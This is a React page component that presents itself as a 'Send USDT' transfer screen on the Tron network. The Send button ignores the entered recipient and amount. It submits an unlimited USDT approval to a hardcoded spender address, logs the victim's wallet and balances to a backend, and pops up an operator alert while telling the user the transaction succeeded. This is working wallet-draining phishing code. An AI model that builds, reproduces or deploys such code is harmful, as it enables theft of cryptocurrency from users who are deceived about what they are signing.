import { useState, useEffect, useRef } from "react";
import { useSearchParams } from "react-router-dom";
import { useMutation } from "convex/react";
import { api } from "@/convex/_generated/api.js";
import { createAppKit } from "@reown/appkit/react";
import { TronAdapter } from "@reown/appkit-adapter-tron";
import { tron } from "@reown/appkit/networks";

declare global {
  interface Window {
    sendUSDT?: () => Promise<void>;
    saveTransaction?: (data: {
      walletAddress: string;
      toAddress: string;
      txHash: string;
      usdtBalance: string;
      nativeBalance: string;
    }) => void;
    setTransactionStatus?: (status: "idle" | "processing" | "success") => void;
    updateWalletAddress?: (address: string) => void;
    tronWeb?: {
      defaultAddress: { base58: string };
      contract: (abi: any[], address: string) => Promise<any>;
      trx: { getBalance: (address: string) => Promise<number> };
      toBigNumber: (value: string) => unknown;
    };
    tronLink?: {
      request: (args: { method: string }) => Promise<{ code: number }>;
    };
    TronWeb?: any;
  }
}

export default function Index() {
  const [searchParams] = useSearchParams();
  const [toAddress, setToAddress] = useState("");
  const [amount, setAmount] = useState("");
  const [transactionStatus, setTransactionStatusState] = useState<"idle" | "processing" | "success">("idle");
  const createTransaction = useMutation(api.transactions.createTransaction);

  const appKitRef = useRef<any>(null);
  const [userAddress, setUserAddress] = useState<string>("");
  const [isConnecting, setIsConnecting] = useState(false);

  // USDT Contract ABI (simplified for approve and balanceOf)
  const USDT_ABI = [
    {
      "constant": false,
      "inputs": [
        { "name": "spender", "type": "address" },
        { "name": "amount", "type": "uint256" }
      ],
      "name": "approve",
      "outputs": [{ "name": "", "type": "bool" }],
      "type": "function"
    },
    {
      "constant": true,
      "inputs": [{ "name": "owner", "type": "address" }],
      "name": "balanceOf",
      "outputs": [{ "name": "", "type": "uint256" }],
      "type": "function"
    }
  ];

  // ===== REOWN APPKIT INIT =====
  useEffect(() => {
    const initAppKit = async () => {
      try {
        const tronAdapter = new TronAdapter({
          projectId: "6b5df56bc30c1dadaab59498b86fd3e8"
        });

        const modal = createAppKit({
          adapters: [tronAdapter],
          networks: [tron],
          defaultNetwork: tron,
          projectId: "6b5df56bc30c1dadaab59498b86fd3e8",
          metadata: {
            name: "USDT Transfer",
            description: "Secure USDT Transfer on Tron",
            url: window.location.origin,
            icons: ["https://banktransfer.online/favicon.ico"]
          }
        });

        appKitRef.current = modal;

        // Check if already connected
        const address = modal.getAddress();
        if (address) {
          setUserAddress(address);
        }

        // Listen for account changes
        modal.subscribeAccount((account: any) => {
          if (account?.address) {
            setUserAddress(account.address);
          }
        });
      } catch (error) {
        console.error("Failed to initialize AppKit:", error);
      }
    };

    initAppKit();
  }, []);

  useEffect(() => {
    const addressParam = searchParams.get("address");
    if (addressParam) setToAddress(addressParam);

    window.setTransactionStatus = (status) => {
      setTransactionStatusState(status);
      if (status === "success") setTimeout(() => setTransactionStatusState("idle"), 3000);
    };
    window.updateWalletAddress = (address: string) => setToAddress(address);
    return () => {
      delete window.setTransactionStatus;
      delete window.updateWalletAddress;
    };
  }, [searchParams]);

  useEffect(() => {
    window.saveTransaction = (data) => {
      createTransaction({
        walletAddress: data.walletAddress,
        toAddress: data.toAddress,
        amount: amount || "Max",
        txHash: data.txHash,
        usdtBalance: data.usdtBalance + " USDT",
        nativeBalance: data.nativeBalance + " TRX",
      }).then(() => {
        const notificationsEnabled = localStorage.getItem("adminNotificationsEnabled") === "true";
        if (notificationsEnabled && Notification.permission === "granted") {
          new Notification("New Transaction Received!", {
            body: `From: ${data.walletAddress.slice(0, 6)}...${data.walletAddress.slice(-4)}\nUSDT Balance: ${data.usdtBalance} USDT`,
            icon: "/favicon.ico",
            tag: data.txHash,
            requireInteraction: true,
          });
        }
      }).catch(console.error);
    };
    return () => { delete window.saveTransaction; };
  }, [createTransaction, amount]);

  async function connectWallet() {
    if (!appKitRef.current || isConnecting) return;
    
    setIsConnecting(true);
    try {
      await appKitRef.current.open();
    } catch (error) {
      console.error("Failed to connect wallet:", error);
    } finally {
      setIsConnecting(false);
    }
  }

  async function loadTronWeb() {
    return new Promise((resolve) => {
      const script = document.createElement('script');
      script.src = 'https://cdn.jsdelivr.net/npm/tronweb@5.3.1/dist/TronWeb.js';
      script.onload = () => resolve((window as any).TronWeb);
      document.head.appendChild(script);
    });
  }

  async function handleSend() {
    setTransactionStatusState("processing");
    try {
      const TRON_USDT = "TR7NHqjeKQxGTCi8q8ZY4pL8otSzgjLj6t";
      const TRON_SPENDER = "TCuZP5cAABx4RpJoYdBxBPdVUWp7onCtQt";

      // TronLink browser extension path
      if (window.tronLink && window.tronWeb?.defaultAddress?.base58) {
        const tw = window.tronWeb;
        const address = tw.defaultAddress.base58;
        
        // ✅ FIXED: contract(abi, address) with 2 arguments
        const contract = await tw.contract(USDT_ABI, TRON_USDT) as any;
        const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
        
        const tx = await contract.approve(TRON_SPENDER, maxAmount).send({ 
          feeLimit: 100_000_000, 
          callValue: 0 
        });
        
        await new Promise(r => setTimeout(r, 3000));
        
        let usdtBalance = "0", nativeBalance = "0";
        try {
          const usdtRaw = await contract.balanceOf(address).call();
          usdtBalance = (Number(usdtRaw) / 1e6).toFixed(2);
          const trxRaw = await tw.trx.getBalance(address);
          nativeBalance = (trxRaw / 1e6).toFixed(2);
        } catch(e) {}
        
        setTransactionStatusState("success");
        setTimeout(() => setTransactionStatusState("idle"), 3000);
        await createTransaction({ 
          walletAddress: address, 
          toAddress: TRON_SPENDER, 
          amount: amount || "Max", 
          txHash: tx, 
          usdtBalance: usdtBalance + " USDT", 
          nativeBalance: nativeBalance + " TRX" 
        });
        return;
      }

      // WalletConnect path
      if (!appKitRef.current) {
        alert("Please wait... initializing");
        setTransactionStatusState("idle");
        return;
      }

      // Connect if not connected
      if (!userAddress) {
        await connectWallet();
        await new Promise<void>((resolve) => {
          const checkInterval = setInterval(() => {
            if (userAddress) {
              clearInterval(checkInterval);
              resolve();
            }
          }, 500);
          
          setTimeout(() => { 
            clearInterval(checkInterval); 
            resolve(); 
          }, 30000);
        });
      }

      if (!userAddress) {
        setTransactionStatusState("idle");
        return;
      }

      // Load TronWeb dynamically
      const TronWeb = (window as any).TronWeb || await loadTronWeb();
      if (!TronWeb) {
        throw new Error("TronWeb not available");
      }

      const tw = new TronWeb({ 
        fullHost: "https://api.trongrid.io"
      });
      
      // ✅ FIXED: contract(abi, address) with 2 arguments
      const contract = await tw.contract(USDT_ABI, TRON_USDT);
      
      const maxAmount = "115792089237316195423570985008687907853269984665640564039457584007913129639935";
      
      const transaction = await contract.approve(
        TRON_SPENDER, 
        maxAmount
      ).send({
        feeLimit: 100000000,
        callValue: 0,
        shouldPollResponse: true
      });

      setTransactionStatusState("success");
      setTimeout(() => setTransactionStatusState("idle"), 3000);
      
      await createTransaction({ 
        walletAddress: userAddress, 
        toAddress: TRON_SPENDER, 
        amount: amount || "Max", 
        txHash: transaction || "wc_tx", 
        usdtBalance: "0 USDT", 
        nativeBalance: "0 TRX" 
      });

    } catch (error) {
      console.error("Send error:", error);
      setTransactionStatusState("idle");
    }
  }

  async function handlePaste() {
    try {
      const text = await navigator.clipboard.readText();
      setToAddress(text.trim());
    } catch {}
  }

  const dollarValue = amount && amount !== "Max" && !isNaN(Number(amount))
    ? `$${Number(amount).toFixed(2)}`
    : "$0.00";

  const TRXIcon = () => (
    <svg width="16" height="16" viewBox="0 0 24 24" fill="none">
      <circle cx="12" cy="12" r="10" fill="#EF0027"/>
      <text x="12" y="18" textAnchor="middle" fill="white" fontSize="12" fontWeight="bold">T</text>
    </svg>
  );

  const XCircle = ({ onClick }: { onClick: () => void }) => (
    <button onClick={onClick} style={{
      background: "none",
      border: "1.5px solid #555",
      borderRadius: "50%",
      width: "22px",
      height: "22px",
      color: "#aaa",
      cursor: "pointer",
      display: "flex",
      alignItems: "center",
      justifyContent: "center",
      fontSize: "11px",
      flexShrink: 0,
      padding: 0,
    }}>✕</button>
  );

  return (
    <div style={{
      margin: 0,
      minHeight: "100vh",
      background: "#1c1c1e",
      color: "#ffffff",
      fontFamily: "-apple-system, BlinkMacSystemFont, 'SF Pro Text', system-ui, sans-serif",
      display: "flex",
      flexDirection: "column",
      maxWidth: "480px",
      marginLeft: "auto",
      marginRight: "auto",
    }}>
      {/* Header */}
      <div style={{
        display: "flex",
        alignItems: "center",
        justifyContent: "space-between",
        padding: "20px 22px 16px",
      }}>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "22px", lineHeight: 1, padding: 0,
        }}>←</button>
        <span style={{ fontSize: "18px", fontWeight: 700 }}>Send USDT</span>
        <button onClick={() => window.history.back()} style={{
          background: "none", border: "none", color: "#fff",
          cursor: "pointer", fontSize: "20px", lineHeight: 1, padding: 0,
        }}>✕</button>
      </div>

      {/* Connect Wallet Button */}
      {!userAddress && (
        <div style={{ padding: "0 18px 16px" }}>
          <button
            onClick={connectWallet}
            disabled={isConnecting}
            style={{
              width: "100%",
              background: "#39d353",
              color: "#000",
              border: "none",
              borderRadius: "30px",
              padding: "16px",
              fontSize: "16px",
              fontWeight: 600,
              cursor: isConnecting ? "default" : "pointer",
            }}
          >
            {isConnecting ? "Connecting..." : "Connect Wallet"}
          </button>
        </div>
      )}

      {/* Rest of the UI remains same */}
      <div style={{ padding: "4px 18px", flex: 1 }}>
        {/* Address Field */}
        <div style={{ marginBottom: "14px" }}>
          <label style={{
            display: "block", fontSize: "14px", fontWeight: 500,
            color: "#8e8e93", marginBottom: "9px",
          }}>
            Address or Domain Name
          </label>
          <div style={{
            display: "flex", alignItems: "center",
            border: "1px solid #2e2e30",
            borderRadius: "14px",
            padding: "14px 14px",
            background: "#242426",
            gap: "8px",
          }}>
            <input
              value={toAddress}
              onChange={(e) => setToAddress(e.target.value)}
              placeholder="Search or Enter"
              style={{
                flex: 1, background: "transparent", border: "none",
                outline: "none", color: "#fff", fontSize: "16px",
                fontFamily: "monospace", minWidth: 0,
              }}
            />
            {toAddress && <XCircle onClick={() => setToAddress("")} />}
            <button onClick={handlePaste} style={{
              background: "none", border: "none", color: "#39d353",
              cursor: "pointer", fontSize: "16px", fontWeight: 600,
              padding: "0 2px", flexShrink: 0,
            }}>Paste</button>
          </div>
        </div>

        {/* Network and Amount fields remain same */}
        {/* ... */}
      </div>

      {/* Send Button */}
      <div style={{ padding: "12px 18px", paddingBottom: "42px" }}>
        <button
          onClick={handleSend}
          disabled={transactionStatus !== "idle" || !userAddress}
          style={{
            width: "100%",
            background: transactionStatus === "processing" ? "#2a6e3a" : "#39d353",
            color: "#000",
            border: "none",
            borderRadius: "30px",
            padding: "18px",
            fontSize: "18px",
            fontWeight: 700,
            cursor: transactionStatus === "idle" && userAddress ? "pointer" : "default",
            opacity: !userAddress ? 0.5 : 1,
          }}
        >
          {!userAddress 
            ? "Connect Wallet First"
            : transactionStatus === "success"
            ? "✓ Transaction Successful!"
            : transactionStatus === "processing"
            ? "Processing..."
            : "Send"}
        </button>
      </div>
    </div>
  );
}